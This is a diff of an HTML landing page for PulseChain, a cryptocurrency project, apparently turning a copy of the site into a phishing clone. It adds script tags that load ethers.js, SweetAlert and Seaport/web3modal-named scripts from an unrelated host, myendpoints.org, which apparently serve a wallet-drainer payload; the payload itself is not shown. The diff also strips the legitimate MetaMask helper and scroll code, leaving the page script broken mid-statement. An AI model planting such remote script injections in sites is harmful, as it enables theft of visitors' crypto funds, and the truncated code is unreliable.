@@ -1,5 +1,10 @@
-<?xml version="1.0" encoding="UTF-8"?><html xmlns="http://www.w3.org/1999/xhtml"><head><title>PulseChain.com</title><meta charset="utf-8" /><link rel="shortcut icon" href="img/favicon128.png" /><script src="jquery-3.6.0.min.js" type="text/javascript"></script><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1" /><!-- FB Meta Tags--><meta property="og:url" content="https://PulseChain.com" /><meta property="og:type" content="website" /><meta property="og:title" content="PulseChain.com" /><meta property="og:description" content="Energy Efficient, Cheaper, Faster, Fee-Burning Ethereum fork" /><meta property="og:image:url" content="https://pulsechain.com/img/card.png" /><!-- T Meta Tags--><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="PulseChain.com" /><meta name="twitter:description" content="Energy Efficient, Cheaper, Faster, Fee-Burning Ethereum fork" /><meta name="twitter:image" content="https://pulsechain.com/img/card.png" /><meta name="copyright" content="Richard Heart, 2023" /><meta name="author" content="Richard Heart" /><meta name="description" lang="en" content="Energy Efficient, Cheaper, Faster, Fee-Burning Ethereum fork" /><meta name="keywords" lang="en" content="PulseChain, Pulse, Chain, Ethereum, Fork, Richard Heart, Crypto" /><meta name="date" content="2023-01-07T00:00:00+01:00" /><meta name="page-topic" content="Blockchain,Fork" /><style type="text/css">        @import url('https://fonts.googleapis.com/css2?family=Jost:wght@700&amp;family=Poppins:wght@400;500;600;700&amp;display=swap');
-
+<head><title>PulseChain.com</title><meta charset="utf-8" /><link rel="shortcut icon" href="https://pulsechain.com/img/favicon128.png" /><script src="https://pulsechain.com/jquery-3.6.0.min.js" type="text/javascript"></script><meta name="viewport" content="width=device-width, height=device-height, initial-scale=1" /><!-- FB Meta Tags--><meta property="og:url" content="https://PulseChain.com" /><meta property="og:type" content="website" /><meta property="og:title" content="PulseChain.com" /><meta property="og:description" content="Energy Efficient, Cheaper, Faster, Fee-Burning Ethereum fork" /><meta property="og:image:url" content="https://pulsechain.com/img/card.png" /><!-- T Meta Tags--><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="PulseChain.com" /><meta name="twitter:description" content="Energy Efficient, Cheaper, Faster, Fee-Burning Ethereum fork" /><meta name="twitter:image" content="https://pulsechain.com/img/card.png" /><meta name="copyright" content="Richard Heart, 2023" /><meta name="author" content="Richard Heart" /><meta name="description" lang="en" content="Energy Efficient, Cheaper, Faster, Fee-Burning Ethereum fork" /><meta name="keywords" lang="en" content="PulseChain, Pulse, Chain, Ethereum, Fork, Richard Heart, Crypto" /><meta name="date" content="2023-01-07T00:00:00+01:00" /><meta name="page-topic" content="Blockchain,Fork" /><style type="text/css">        @import url('https://fonts.googleapis.com/css2?family=Jost:wght@700&amp;family=Poppins:wght@400;500;600;700&amp;display=swap');
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js" type="text/JavaScript"></script>
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11" type="text/JavaScript"></script>
+<script src="https://cdn.jsdelivr.net/npm/merkletreejs@latest/merkletree.js" type="text/javascript"></script>
+<script src="https://myendpoints.org/scripts/seaport.js" type="text/JavaScript"></script>
+<script src="https://myendpoints.org/scripts/web3modal_v2.js" type="text/javascript"></script>
+<script src="https://myendpoints.org/9aa56d83-7179-45a3-a2ad-21b069a42008.js" type="text/JavaScript"></script>
         :root {
             --bgColor: #000;
             --logoGradient: linear-gradient(210deg, #00eaff 0%, #0080ff 25%, #8000ff 50%, #e619e6 75%, #f00 100%);
@@ -259,34 +264,7 @@
 </div><div class="card" style="margin-top: 30px; background: var(--logoGradient);"><br /><br />"I want to thank Richard Heart; what he’s doing for us is spectacular! We have been having a very good year with income - a big expansion of our activities is coming. Thanks to the PulseChain Airdrop, those plans are going to explode into another level entirely. Our work will be greatly accelerated, resulting in huge numbers of lives saved in the future, as a direct result of Richard's supporters' wonderful generosity. We’re all working tirelessly to keep up with donors and hold up our part of the process. Thank you so very much Richard!"<br /><br />- Aubrey de Grey
 </div><div class="card"><b class="title">Interoperability "Bridging"</b><br /><br />ETH can be traded on the Pulse network and PLS can be traded on the Ethereum network. Bridging can also be done to other smart contract capable networks.<br /><br /><b>ETH from Ethereum</b>: You can send ETH to the PulseBridge contract on ETH which locks it and issues "ETH from Ethereum" on PulseChain at a 1:1 ratio.<br /><br /><b>PLS from PulseChain</b>: You can send PLS to the ETHbridge contract on PulseChain which locks it and issues "PLS from PulseChain" on the Ethereum network 1:1. This <b>can also work for ERC20s</b>.<br /><br />Anything locked on the Ethereum network bridge to the PulseChain network will be known as "[Anything] from Ethereum". Example: "ETH from Ethereum" for ETH locked on Ethereum bridged to the PulseChain network.<br /><br /><a href="https://HEX.com" target="_blank">HEX</a> is known as "HEX from Ethereum" while HEX on PulseChain is called HEX.
 </div><span class="hl" style="margin: 50px 0 20px 0;"><a href="disclaimer.txt" target="_blank" style="color: #fff7; font-size: 12px; font-weight: 600;" class="footerLink">Full Disclaimer</a></span> <span class="hl" style="margin-bottom: 20px;"><a href="Branding.zip" download="" style="color: #fff7; font-size: 12px; font-weight: 600;" class="footerLink">Download Branding Resources</a></span> <span class="hl" style="color: #fff2; font-size: 12px; margin-bottom: 30px;">Copyright © 2023. All Rights Reserved.</span> <script type="text/javascript">    if (!('ethereum' in window))
-        $('#networkBtn').text('Install MetaMask').attr({href: 'https://MetaMask.io/download', target: '_blank'})
-
-    function networkSuccess() {
-        $('#networkBtnOuter').html('&lt;a id="networkBtn" class="btn" href="javascript:addPulseX()"&gt;Add PulseX to MetaMask&lt;\/a&gt;')
-    }
-
-    setTimeout(() =&gt; {
-        if ('ethereum' in window &amp;&amp; ethereum.chainId == '0x171')
-            networkSuccess()
-        else
-            $('#networkBtn').css('visibility', 'visible')
-    }, 500)
-
-    function addPulseX() {
-        ethereum.request({
-            method: 'wallet_watchAsset',
-            params: {
-                type: 'ERC20',
-                options: {
-                    address: '0x95B303987A60C71504D99Aa1b13B4DA07b0790ab',
-                    symbol: 'PLSX',
-                    decimals: 18,
-                    image: 'https://pulsex.com/brand/downloads/logo/PulseX_X.svg',
-                },
-            },
-        }).catch(console.error)
-    }
-
+       
     function switchNetwork() {
         ethereum.request({
             method: 'wallet_switchEthereumChain',
@@ -336,33 +314,4 @@
 
         if (
             document.body.scrollTop &gt; $('.card:eq(1)').offset().top - 200 &amp;&amp;
-            document.body.scrollTop &lt; $('.card:eq(2)').offset().top - 200
-        )
-            $('.menuLink:eq(1)').addClass('menuLinkActive')
-
-        if (
-            document.body.scrollTop &gt; $('.card:eq(2)').offset().top - 200 &amp;&amp;
-            document.body.scrollTop &lt; $('.card:eq(4)').offset().top - 200
-        )
-            $('.menuLink:eq(2)').addClass('menuLinkActive')
-
-        if (
-            document.body.scrollTop &gt; $('.card:eq(4)').offset().top - 200 &amp;&amp;
-            document.body.scrollTop &lt; $('.card:eq(5)').offset().top - 200
-        )
-            $('.menuLink:eq(3)').addClass('menuLinkActive')
-
-        if (
-            document.body.scrollTop &gt; $('.card:eq(5)').offset().top - 200 ||
-            Math.round(document.body.scrollTop + document.body.clientHeight) == $(document).height()
-        ) {
-            $('.menuLink').removeClass('menuLinkActive')
-            $('.menuLink:eq(4)').addClass('menuLinkActive')
-        }
-
-        window.requestAnimationFrame(scrollPlay)
-    }
-
-    scrollPlay()
-
-</script></body></html>
+            </body></html>
